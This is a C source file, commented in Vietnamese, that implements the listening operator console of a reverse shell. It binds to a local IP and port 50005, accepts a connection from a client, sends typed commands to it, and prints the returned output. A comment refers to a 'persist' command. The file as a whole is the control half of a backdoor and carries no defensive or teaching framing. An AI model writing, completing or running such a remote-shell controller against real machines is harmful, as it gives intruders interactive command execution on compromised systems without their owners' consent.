#include <arpa/inet.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

int main() {
  int sock;
  int client_socket;
  char buffer[1024];
  char response[18324];
  struct sockaddr_in server_address, client_address;
  socklen_t client_length;

  // tao socket
  sock = socket(AF_INET, SOCK_STREAM, 0);
  if (sock < 0) {
    printf("Error for create socket!!");
    return 1;
  }

  // config server_address
  server_address.sin_family = AF_INET;
  // tam thoi ip khong co dinh duoc
  server_address.sin_addr.s_addr = inet_addr("192.168.0.103");
  server_address.sin_port = htons(50005);

  // bind socket() den dia chi va port
  if (bind(sock, (struct sockaddr *)&server_address, sizeof(server_address)) <
      0) {
    printf("Error blinding socket");
    return 1;
  }

  // lang nghe ket noi
  if (listen(sock, 5) < 0) {
    printf("Error listening in socket!!");
    return 1;
  }

  // chap nhan ket noi tu client

  client_length = sizeof(client_address);
  client_socket =
      accept(sock, (struct sockaddr *)&client_address, &client_length);
  if (client_socket < 0) {
    printf("Error accepting connection!!");
    return 1;
  }
  while (1) {
    memset(&buffer, 0, sizeof(buffer));
    memset(&response, 0, sizeof(response));

    // nhap lenh tu nguoi dung
    printf("Shell =>");
    fgets(buffer, sizeof(buffer), stdin);
    strtok(buffer, "\n");

    // gui lenh den client
    write(client_socket, buffer, sizeof(buffer));

    // su li lenh exit
    if (strncmp("q", buffer, 1) == 0) {
      break;
    }

    // xu li lenh "cd"(khong can response)
    else if (strncmp("cd", buffer, 3) == 0) {
      continue;
    }

    // xu li lenh persist va cach commandline khac
    else {
      // nhan phan hoi tu client
      recv(client_socket, response, sizeof(response), MSG_WAITALL);
      printf("%s", response);
    }
  }
  close(client_socket);
  close(sock);
  return 0;
}
